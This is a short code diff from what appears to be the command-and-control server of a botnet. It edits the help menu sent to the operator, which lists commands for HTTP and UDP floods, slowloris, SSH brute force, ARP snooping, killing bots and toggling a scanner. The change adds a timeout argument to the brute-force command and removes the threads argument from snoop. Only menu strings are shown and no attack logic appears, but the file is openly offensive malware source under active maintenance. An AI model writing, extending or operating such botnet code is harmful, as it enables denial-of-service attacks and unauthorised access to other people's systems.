@@ -245,8 +245,8 @@ def Commander(sock,rlock):#cnc server
                                 sock.send('  HTTP Flood: !http host port threads path\r\n'.encode())    #http flood
                                 sock.send('  slowloris : !slow host port threads conn path\r\n'.encode())    #slowloris
                                 sock.send('  UDP  Flood: !udp  host port threads size\r\n'.encode()) #udp flood
-                                sock.send('  Brute Force SSH: !bf_ssh host username\r\n'.encode()) #brute force on port 22 of host
-                                sock.send('  ARP Snoop: !snoop  threads \r\n\r\n'.encode()) #snooping bot/host arp table for local machines
+                                sock.send('  Brute Force SSH: !bf_ssh host username timeout \r\n'.encode()) #brute force on port 22 of host
+                                sock.send('  ARP Snoop: !snoop  \r\n\r\n'.encode()) #snooping bot/host arp table for local machines
                                 sock.send('    !stop    : stop attack\r\n'.encode())
                                 sock.send('    !kill    : kill all the bots\r\n'.encode())
                                 sock.send('    !scan 1/0: enable/disable scanner\r\n'.encode())
